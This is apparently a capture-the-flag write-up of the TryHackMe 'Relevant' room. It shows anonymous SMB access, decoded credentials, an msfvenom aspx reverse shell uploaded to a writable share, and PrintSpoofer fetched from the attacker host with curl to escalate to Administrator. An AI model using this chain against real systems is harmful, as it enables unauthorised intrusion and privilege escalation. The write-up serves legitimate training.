```
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope
    Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

First we start with an nmap Scan...

```nmap -sC -sV -T4 -oN scan.txt -p- <Target IP>```

```

Nice we've got http and smb ports open. Let's enumerate SMB first

```
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ smbclient -L //10.10.166.204/ -N

```

Checking for anonymous access too the SMB shares 

```
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ smbclient //10.10.166.204/nt4wrksv -N

getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

we have anonymous access to the share and we downloaded passwords.txt. let's check the content 

![image](https://user-images.githubusercontent.com/87468669/194743542-2005798d-fc95-4c1d-80bc-d5605f9b9908.png)

It looks like a base64 encoding, let's decode it 

```
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d                                                                       
Bob - !P@$$W0rD!123                                                                                                                                                                       
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$     
```

we got some creds ðŸ¤”... we don't have ssh to use them, so let's enumerate the http service on port 

![image](https://user-images.githubusercontent.com/87468669/194743714-47b33d44-88ae-4bb4-a4ac-1e41b0199877.png)

check the smb share path on the webpage let's see.

![image](https://user-images.githubusercontent.com/87468669/194743758-f6355c5a-53ea-468b-8202-b275ac2be83e.png)

worked. let's check if we can upload a file into the smb server 

```
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ smbclient //10.10.166.204/nt4wrksv -N

smb: \> 
smb: \> 

```

we have upload permission, let's check the uploaded file in the browser 

![image](https://user-images.githubusercontent.com/87468669/194743915-78688677-2619-4981-96f2-302b04299a0e.png)

Great we can see our uploaded content, let's create a reverse shell and upload it through the smb Server. we would be using msfvenom payload

```
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.12.222 LPORT=9999 -f aspx > violence.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3432 bytes

```

let's upload it to the smb share

```
â”Œâ”€â”€(n16hth4wkã‰¿n16hthawk-sec)-[~/Documents/THM/Relevant]
â””â”€$ smbclient //10.10.166.204/nt4wrksv -N 
Try "help" to get a list of possible commands.
smb: \> put violence.aspx 
putting file violence.aspx as \violence.aspx (6.8 kb/s) (average 6.8 kb/s)
smb: \> ls
  .                                   D        0  Sun Oct  9 02:37:00 2022

                7735807 blocks of size 4096. 5137483 blocks available

```

set your ncat listener ready 

![image](https://user-images.githubusercontent.com/87468669/194744120-e07e7853-506a-48b4-af2e-e739b3686c1c.png)

now let's navigate to the browser and try pop up the shell

![image](https://user-images.githubusercontent.com/87468669/194744182-30b2d6a5-a1ac-48d0-96dc-70eb3e4afa49.png)

Check back our listener

![image](https://user-images.githubusercontent.com/87468669/194744269-a42e2bd1-d625-45df-9a65-0f8fca17a9ed.png)

We got shell into the system

```
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

```

```SeImpersonatePrivilege``` is enabled, now let find a way to abuse to get administrator access. And with the help of a tools called ```PrintSpoofer```

![image](https://user-images.githubusercontent.com/87468669/194744560-7c94aa38-e6db-4f60-bc9d-d21504abfe66.png)

Now let's download it into our target machine

```
c:\Users\Bob>powershell -c curl http://10.8.12.222:8000/PrintSpoofer.exe -o printspoofer.exe

printspoofer.exe -i -c powershell
```

We are now Administrator great 

![image](https://user-images.githubusercontent.com/87468669/194745074-41bab5ea-2e10-4765-a741-8a59ed483283.png)

And we are done. Hope you had fun ðŸ˜‰
